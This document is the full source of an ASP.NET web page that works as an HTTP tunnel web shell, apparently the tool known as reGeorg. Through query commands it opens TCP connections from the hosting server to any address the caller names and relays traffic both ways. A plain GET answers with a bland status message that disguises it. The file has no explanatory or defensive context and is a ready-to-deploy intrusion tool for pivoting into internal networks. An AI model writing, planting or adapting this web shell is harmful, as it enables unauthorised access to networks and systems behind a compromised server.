<%@ Page Language="C#" EnableSessionState="True" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%
try
{
    if(Request.HttpMethod=="POST")
    {
        string cmd=Request.QueryString["cmd"];
        if(cmd=="connect")
        {
            try
            {
                string target=Request.QueryString["target"];
                int port=int.Parse(Request.QueryString["port"]);
                IPAddress ip=IPAddress.Parse(target);
                IPEndPoint ep=new IPEndPoint(ip,port);
                Socket s=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
                s.Connect(ep);
                s.Blocking=false;
                Session["sock"]=s;
                Response.AddHeader("X-STATUS","OK");
            }
            catch(Exception ex)
            {
                Response.AddHeader("X-ERROR",ex.Message);
                Response.AddHeader("X-STATUS","FAIL");
            }
        }
        else if(cmd=="disconnect")
        {
            try{((Socket)Session["sock"]).Close();}catch{}
            Session.Abandon();
            Response.AddHeader("X-STATUS","OK");
        }
        else if(cmd=="forward")
        {
            Socket s=(Socket)Session["sock"];
            try
            {
                int l=Request.ContentLength;
                byte[] b=new byte[l];
                int r=0;
                while((r=Request.InputStream.Read(b,0,b.Length))>0)
                {
                    s.Send(b, r, SocketFlags.None);
                }
                Response.AddHeader("X-STATUS","OK");
            }
            catch(Exception ex)
            {
                Response.AddHeader("X-ERROR",ex.Message);
                Response.AddHeader("X-STATUS","FAIL");
            }
        }
        else if(cmd=="read")
        {
            Socket s=(Socket)Session["sock"];
            try
            {
                byte[] buf=new byte[512];
                int c=0;
                try
                {
                    while((c=s.Receive(buf))>0)
                    {
                        byte[] outb=new byte[c];
                        Buffer.BlockCopy(buf,0,outb,0,c);
                        Response.BinaryWrite(outb);
                    }
                    Response.AddHeader("X-STATUS","OK");
                }
                catch(SocketException)
                {
                    Response.AddHeader("X-STATUS","OK");
                    return;
                }
            }
            catch(Exception ex)
            {
                Response.AddHeader("X-ERROR",ex.Message);
                Response.AddHeader("X-STATUS","FAIL");
            }
        }
        else
        {
            Response.StatusCode=404;
            Response.End();
        }
    }
    else
    {
        Response.Write("Georg says, 'All seems fine'");
    }
}
catch(Exception ex)
{
    Response.AddHeader("X-ERROR",ex.Message);
    Response.AddHeader("X-STATUS","FAIL");
}
%>
